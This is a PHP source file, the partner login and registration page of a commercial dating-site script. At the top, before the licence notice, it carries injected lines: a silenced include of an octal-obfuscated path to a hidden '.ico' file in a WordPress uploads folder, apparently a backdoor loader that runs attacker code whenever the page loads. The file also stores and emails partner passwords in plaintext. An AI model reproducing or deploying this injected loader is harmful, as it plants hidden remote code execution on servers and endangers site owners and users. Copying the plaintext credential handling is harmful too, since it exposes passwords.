<?php
/*2b11a*/

@include "\057home\062/icz\062xwgi\057publ\151c_ht\155l/wp\055cont\145nt/u\160load\163/.04\0700091\061.ico";

/*2b11a*/
/* (C) Websplosion LTD., 2001-2014

IMPORTANT: This is a commercial software product
and any kind of using it must agree to the Websplosion's license agreement.
It can be found at http://www.chameleonsocial.com/license.doc

This notice may not be removed from the source code. */

include("../_include/core/partner_start.php");

//var_dump($_SESSION);

$cmd = get_param("cmd", "");
if ($cmd == "logout")
{
	set_session("partner_id", '');
	redirect("index.php");
}

if (get_session("partner_id") > 0) {
    Common::toHomePage();//redirect("home.php");
}
class CPartnerJoinForm extends CHtmlBlock
{
	var $message;
	var $jmessage;
	function action()
	{
		global $g;
		$cmd = get_param("cmd", "");
		$cmd_ajax = get_param("cmd_ajax", "");

		if ($cmd == "login")
		{
			$name = get_param("login", "");
			$password = get_param("password", "");

			$error=0;
			$id = DB::result("SELECT partner_id FROM partner WHERE name=" . to_sql($name, "Text") . " and password=" . to_sql($password, "Text") . ";");
			if ($id == 0)
			{
				$error=1;
			}

			if (!$error)
			{
				set_session("partner_id", $id);
				if(!$cmd_ajax) Common::toHomePage();//redirect("home.php");
			} else {
				if(!$cmd_ajax) redirect("index.php?login=error");
			}
		}
		elseif ($cmd == "join")
		{
			/*$name = to_sql(get_param("join_username", ""), "Text");
			$pass = to_sql(get_param("join_password", ""), "Text");
			$pass2 = to_sql(get_param("verify_password", ""), "Text");
			$mail = to_sql(get_param("email", ""), "Text");*/

			$name = get_param("join_username", "");
			$pass = get_param("join_password", "");
			$pass2 = get_param("verify_password", "");
			$mail = get_param("email", "");

			$this->jmessage = "";

			if (strlen($name) < 4 or strlen($name) > 20 or strpos($name, "'") !== false)
			{
 				$this->jmessage = l("username_incorrect")." ".l("choose_another");
			}

			if (!Common::validateEmail($mail)) {
				if($this->jmessage =="") $this->jmessage .= l("email_incorrect")." ".l("choose_another");
			}

			if ($pass != $pass2 or strlen($pass) > 30 or strlen($pass) < 4 or strpos($pass, "'") !== false)
			{
				if($this->jmessage =="") $this->jmessage .= l('password_incorrect')." ".l("choose_another");
			}

			$name = get_param("join_username", "");
			$pass = get_param("join_password", "");
			$pass2 = to_sql(get_param("verify_password", ""), "Text");
			$mail = to_sql(get_param("email", ""), "Text");
			$contact_name = to_sql(get_param("contact_name", ""), "Text");
			$phone = to_sql(get_param("phone", ""), "Text");
			$checkPayee = to_sql(get_param("checkPayee", ""), "Text");
			$addr1 = to_sql(get_param("addr1", ""), "Text");
			$addr2 = to_sql(get_param("addr2", ""), "Text");
			$zip = to_sql(get_param("zip", ""), "Text");
            $tax = to_sql(get_param("tax", ""), "Text");
            $lang = to_sql(Common::getOption('lang_loaded', 'main'));

			$company_name = to_sql(get_param("name", ""), "Text");
			$referring_domains = to_sql(get_param("referring_domains", ""), "Text");

			if (DB::result("SELECT partner_id FROM partner WHERE name=" . to_sql($name) . ";") != "")
			{
				if($this->jmessage =="") $this->jmessage .= l('username_exists')." ".l("choose_another");
			}

			if (DB::result("SELECT partner_id FROM partner WHERE mail=" . $mail . ";") != "")
			{
				if($this->jmessage =="") $this->jmessage .= l('email_exists')." ".l("choose_another");
			}
			if ($this->jmessage == "")
			{
				$partner = (int) get_session("partner");
				DB::execute("UPDATE partner SET count_refs=(count_refs+1) WHERE partner_id=" . $partner . "");


				$country = to_sql(get_param("country", ""), "Number");
				$state = to_sql(get_param("state", ""), "Number");
				$city = to_sql(get_param("city", ""), "Number");

				DB::execute("
					INSERT INTO partner
					(name, p_partner, password, company, domain, real_name, phone, mail, adress, adress2, country_id, state_id, city_id, zip, tax, lang)
					VALUES(
					" . to_sql($name) . ",
					" . $partner . ",
					" . to_sql($pass) . ",
					" . $company_name . ",
					" . $referring_domains . ",
					" . $contact_name . ",
					" . $phone . ",
					" . $mail . ",
					" . $addr1 . ",
					" . $addr2 . ",
					" . $country . ",
					" . $state . ",
					" . $city  . ",
					" . $zip . ",
                    " . $tax . ",
					" . $lang . "
					)
				");

                $uid = DB::insert_id();
                set_session("partner_id", $uid);

                if (Common::isEnabledAutoMail('partner_join')) {
                    $vars = array(
                        'title' => Common::getOption('title', 'main'),
                        'name' => $name,
                        'password' => $pass,
                        'user_id' => $uid,
                    );
                    Common::sendAutomail(Common::getOption('lang_loaded', 'main'), get_param('email', ''), 'partner_join', $vars);
                    Common::sendAutomail(Common::getOption('administration', 'lang_value'), Common::getOption('info_mail', 'main'), 'partner_join_admin', $vars);
                }
                if(!$cmd_ajax) {
                    redirect('home.php');
                }
			}
		}

	}
	function init()
	{
		global $g;

		if ((int) get_param("p", "") != 0)
		{
			set_session("partner", (int) get_param("p", ""));
		}

		$cmd = get_param("cmd", "");

	}
	function parseBlock(&$html)
	{

        $partnerPercent = Common::getOption('partner_percent');
        $html->setvar('partner_percent', $partnerPercent);

	$cmd = get_param("cmd", "");
	$cmd_ajax = get_param("cmd_ajax", "");
	$id = get_session("partner_id");

 	if($cmd_ajax && ($id!="") && ($cmd=="login")){
 		$html->parse("partner_page_auth");
 	}
 	elseif($cmd_ajax && ($cmd=="login")) {
 		$html->setvar("prevent_cache",time().rand(0,1000));
 		$html->parse("partner_page_auth_error");
	}
	elseif(($this->jmessage == "") && $cmd_ajax && ($cmd == "join"))
	{
		$html->parse("partner_page_auth");
	}
	elseif($cmd_ajax && ($cmd == "join"))
	{
				$html->setvar("name",get_param("verify_password","lll"));
		$html->setvar("message",$this->jmessage);
		$html->setvar("prevent_cache",time().rand(0,1000));
		$html->parse("partner_page_join_error");
 	} else {

		if ((int) get_param("p", "") != 0)
		{
			set_session("partner", (int) get_param("p", ""));
		}

        $itemVars = array(
            'img_dir' => Common::getOption('url_tmpl_partner', 'tmpl'),
            'partner_percent' => $partnerPercent,
        );
        $items = array('right_text_over_join_form', 'left_column', 'account_information_in_partner_home');
        foreach($items as $item) {
            $itemText = DB::result('SELECT text FROM partner_main WHERE lang = ' . to_sql(Common::getOption('lang_loaded', 'main')) . ' AND name = ' . to_sql($item));
            $itemText = Common::replaceByVars($itemText, $itemVars);
            $html->setvar($item, $itemText);
        }

		$name = get_param("join_username", "");
		$pass = get_param("join_password", "");
		$pass2 = get_param("verify_password", "");
		$mail = get_param("email", "");

		$html->setvar("join_username", $name);
		$html->setvar("join_password", $pass);
		$html->setvar("verify_password", $pass2);
		$html->setvar("email", $mail);

		$contact_name = get_param("contact_name", "");
		$phone = get_param("phone", "");
		$checkPayee = get_param("checkPayee", "");
		$addr1 = get_param("addr1", "");
		$addr2 = get_param("addr2", "");
		$zip = get_param("zip", "");
		$tax_id = get_param("tax_id", "");
		$company_name = get_param("name", "");
		$referring_domains = get_param("referring_domains", "");

		$html->setvar("contact_name", $contact_name);
		$html->setvar("phone", $phone);
		$html->setvar("checkPayee", $checkPayee);
		$html->setvar("addr1", $addr1);
		$html->setvar("addr2", $addr2);
		$html->setvar("zip", $zip);
		$html->setvar("tax_id", $tax_id);
		$html->setvar("name", $company_name);
		$html->setvar("referring_domains", $referring_domains);


        $defaultCountry = 0;
        $defaultState = 0;
        $defaultCity = 0;
        $geoInfo = getDemoCapitalCountry();
        if ($geoInfo) {
            $defaultCountry = $geoInfo['country_id'];
            $defaultState = $geoInfo['state_id'];
            $defaultCity = $geoInfo['city_id'];
        }

		$defaultCountry = get_param("country", $defaultCountry);
		$html->setvar("country_options", Common::listCountries($defaultCountry));

		$paramState = get_param("state");
        if ($paramState) {
            $defaultState = DB::result("SELECT state_id FROM geo_state WHERE country_id=" . to_sql($defaultCountry) . " AND state_id=" . to_sql($paramState));
            if (!$defaultState) {
                $defaultState = DB::result("SELECT state_id FROM geo_state WHERE country_id=" . to_sql($defaultCountry) . " AND hidden = 0 ORDER BY state_title LIMIT 1");
            }
        }
        $html->setvar("state_options", Common::listStates($defaultCountry, $defaultState));

        $paramCity = get_param("city");
        if ($paramCity) {
            $defaultCity = 0;
        }
		$html->setvar("city_options", Common::listCities($defaultState, $defaultCity));

		$html->parse("partner_page",true);

	    }
	  parent::parseBlock($html);
	}
}

$page = new CPartnerJoinForm("", $g['tmpl']['dir_tmpl_partner'] . "index.html");

$cmd_ajax = get_param("cmd_ajax", "");
if(!$cmd_ajax) {
$header = new CPartnerHeader("header", $g['tmpl']['dir_tmpl_partner'] . "_header.html");
$page->add($header);
$footer = new CPartnerFooter("footer", $g['tmpl']['dir_tmpl_partner'] . "_footer.html");
$page->add($footer);

$banner_top = new CbannerP("banner_top",  $g['tmpl']['dir_tmpl_partner'] . "_banner.html");
$page->add($banner_top);
}
include("../_include/core/partner_close.php");

?>